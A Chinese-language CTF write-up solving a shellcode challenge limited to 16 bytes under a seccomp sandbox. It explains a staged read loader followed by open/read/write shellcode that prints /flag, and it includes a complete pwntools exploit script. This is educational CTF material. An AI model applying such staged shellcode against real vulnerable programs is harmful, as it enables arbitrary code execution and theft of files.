# simple_shellcode

## 题目简述

程序在固定地址 `0xCAFE0000` 用 `mmap` 分配一页 RWX 内存，只读取 16 字节后便跳转执行。seccomp 禁止 `execve` 和 `execveat`，完整 ORW shellcode 又无法塞进 16 字节，因此需要一个恰好 16 字节的第一阶段加载器，再把任意长度的第二阶段读回同一页执行。

## 解题过程

主函数的关键流程为：

```c
mmap((void *)0xCAFE0000, 0x1000, 7, 33, -1, 0);
read(0, (void *)0xCAFE0000, 0x10);
sandbox();
((void (*)(void))0xCAFE0000)();
```

`prot=7` 表示 `PROT_READ | PROT_WRITE | PROT_EXEC`。沙盒只封禁 `execve`、`execveat`，所以 `read`、`open` 和 `write` 均可使用。

### 第一阶段：16 字节 `read` 加载器

在 amd64 下，下面五条指令的编码总长正好是 16 字节：

```asm
xor eax, eax          /* rax = SYS_read = 0 */
xor edi, edi          /* rdi = stdin = 0 */
mov edx, 0x1000       /* rdx = size */
mov esi, 0xCAFE0000   /* rsi = destination */
syscall
```

它再次执行 `read(0, 0xCAFE0000, 0x1000)`，从而用第二阶段覆盖整页。系统调用返回时，`rip` 已位于首阶段 `syscall` 后方，也就是 `0xCAFE0010`；第二阶段开头放置 NOP sled，便能继续滑到真正的 ORW 代码。

### 第二阶段：读取 `/flag`

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"
io = remote("目标地址", 端口)

stage1 = asm(
    """
    xor eax, eax
    xor edi, edi
    mov edx, 0x1000
    mov esi, 0xCAFE0000
    syscall
    """
)
assert len(stage1) == 0x10
io.sendafter(b"shellcode:", stage1)

stage2 = b"\x90" * 0x100
stage2 += asm(shellcraft.open("/flag"))
stage2 += asm(shellcraft.read(3, 0xCAFE0500, 0x500))
stage2 += asm(shellcraft.write(1, 0xCAFE0500, 0x500))

io.send(stage2)
io.interactive()
```

正常情况下进程原有的三个标准文件描述符为 `0`、`1`、`2`，因此第一次 `open` 返回 `3`。若题目环境改变了文件描述符布局，应在 shellcode 中保存 `open` 的返回值，而不是写死 `3`。

## 方法总结

- 核心技巧：把严格长度限制下的 shellcode拆成“小型加载器 + 完整第二阶段”。
- 关键细节：第一阶段必须不超过 16 字节；覆盖当前代码页后，执行位置从偏移 `0x10` 继续，因此第二阶段需要在该位置提供安全的落点。
- 复用要点：seccomp 禁止拿 shell 时，应按允许的系统调用重新组织目标；若可执行内存可写，优先考虑 staged shellcode 扩展载荷空间。
